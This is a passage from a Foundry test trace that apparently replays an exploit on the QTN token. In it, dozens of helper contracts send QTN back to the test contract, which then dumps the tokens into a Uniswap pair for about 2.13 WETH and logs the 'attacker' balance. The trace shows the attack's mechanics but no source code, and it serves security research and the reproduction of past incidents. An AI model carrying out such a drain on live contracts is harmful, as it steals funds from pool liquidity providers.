    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]) [staticcall]
    │   │   └─ ← [Return] 272420663093630780080987 [2.724e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 272420663093630780080987 [2.724e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 272420663093630780080987 [2.724e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]) [staticcall]
    │   │   └─ ← [Return] 271638444569466631356302 [2.716e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 271638444569466631356302 [2.716e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 271638444569466631356302 [2.716e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]) [staticcall]
    │   │   └─ ← [Return] 270860705250030648905524 [2.708e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 270860705250030648905524 [2.708e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 270860705250030648905524 [2.708e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B]) [staticcall]
    │   │   └─ ← [Return] 270087406771372638941516 [2.7e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 270087406771372638941516 [2.7e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 270087406771372638941516 [2.7e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]) [staticcall]
    │   │   └─ ← [Return] 269318511206406480848167 [2.693e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 269318511206406480848167 [2.693e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 269318511206406480848167 [2.693e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]) [staticcall]
    │   │   └─ ← [Return] 268553981058709369703889 [2.685e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 268553981058709369703889 [2.685e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 268553981058709369703889 [2.685e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]) [staticcall]
    │   │   └─ ← [Return] 267793779256426374548118 [2.677e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 267793779256426374548118 [2.677e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 267793779256426374548118 [2.677e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]) [staticcall]
    │   │   └─ ← [Return] 267037869146278231443908 [2.67e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 267037869146278231443908 [2.67e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 267037869146278231443908 [2.67e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C]) [staticcall]
    │   │   └─ ← [Return] 266286214487670337249035 [2.662e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 266286214487670337249035 [2.662e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 266286214487670337249035 [2.662e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]) [staticcall]
    │   │   └─ ← [Return] 265538779446900955683679 [2.655e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 265538779446900955683679 [2.655e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 265538779446900955683679 [2.655e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]) [staticcall]
    │   │   └─ ← [Return] 264795528591466691807717 [2.647e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 264795528591466691807717 [2.647e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 264795528591466691807717 [2.647e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]) [staticcall]
    │   │   └─ ← [Return] 264056426884463334427162 [2.64e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 264056426884463334427162 [2.64e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 264056426884463334427162 [2.64e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]) [staticcall]
    │   │   └─ ← [Return] 263321439679080208268349 [2.633e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 263321439679080208268349 [2.633e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 263321439679080208268349 [2.633e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36]) [staticcall]
    │   │   └─ ← [Return] 262590532713186219020419 [2.625e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 262590532713186219020419 [2.625e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 262590532713186219020419 [2.625e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25]) [staticcall]
    │   │   └─ ← [Return] 261863672104005814580591 [2.618e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 261863672104005814580591 [2.618e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 261863672104005814580591 [2.618e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA]) [staticcall]
    │   │   └─ ← [Return] 261140824342883125071152 [2.611e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 261140824342883125071152 [2.611e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 261140824342883125071152 [2.611e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A]) [staticcall]
    │   │   └─ ← [Return] 260421956290132582459475 [2.604e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 260421956290132582459475 [2.604e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 260421956290132582459475 [2.604e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4]) [staticcall]
    │   │   └─ ← [Return] 259707035169974357929393 [2.597e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 259707035169974357929393 [2.597e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 259707035169974357929393 [2.597e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC]) [staticcall]
    │   │   └─ ← [Return] 258996028565552991549807 [2.589e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 258996028565552991549807 [2.589e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 258996028565552991549807 [2.589e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d]) [staticcall]
    │   │   └─ ← [Return] 258288904414037624289599 [2.582e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 258288904414037624289599 [2.582e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 258288904414037624289599 [2.582e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301]) [staticcall]
    │   │   └─ ← [Return] 257585631001802277061078 [2.575e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 257585631001802277061078 [2.575e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 257585631001802277061078 [2.575e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3]) [staticcall]
    │   │   └─ ← [Return] 256886176959684655260941 [2.568e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 256886176959684655260941 [2.568e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 256886176959684655260941 [2.568e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d]) [staticcall]
    │   │   └─ ← [Return] 256190511258321990241058 [2.561e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 256190511258321990241058 [2.561e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 256190511258321990241058 [2.561e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE]) [staticcall]
    │   │   └─ ← [Return] 255498603203562461303437 [2.554e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 255498603203562461303437 [2.554e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 255498603203562461303437 [2.554e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [24659] QTN::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [1120] QTN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 11423137272908972363715007 [1.142e25]
    ├─ [57677] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(11423137272908972363715007 [1.142e25], 0, [0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1674003987 [1.674e9])
    │   ├─ [10890] QTN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 11423137272908972363715007 [1.142e25])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 11423137272908972363715007 [1.142e25])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640552616320311098940765924928 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18], 15474229001148084708054981 [1.547e25], 1674002987 [1.674e9]
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 26897366274057057071769988 [2.689e25]
    │   ├─ [37321] Pair::swap(2131376640477927235 [2.131e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [23162] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2131376640477927235 [2.131e18])
    │   │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2131376640477927235 [2.131e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   │   └─ ← [Return] 2895934049347714314 [2.895e18]
    │   │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   │   └─ ← [Return] 26897366274057057071769988 [2.689e25]
    │   │   ├─ emit Sync(reserve0: 2895934049347714314 [2.895e18], reserve1: 26897366274057057071769988 [2.689e25])
    │   │   ├─ emit Swap(sender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 11423137272908972363715007 [1.142e25], amount0Out: 2131376640477927235 [2.131e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 2131376640477927235 [2.131e18]
    │   └─ ← [Stop] 
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2131376640477927235 [2.131e18]
    ├─ [2444] WETH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WETH balance after exploit", val: 2131376640477927235 [2.131e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 308.07ms (16.53ms CPU time)

Ran 2 test suites in 548.38ms (539.85ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
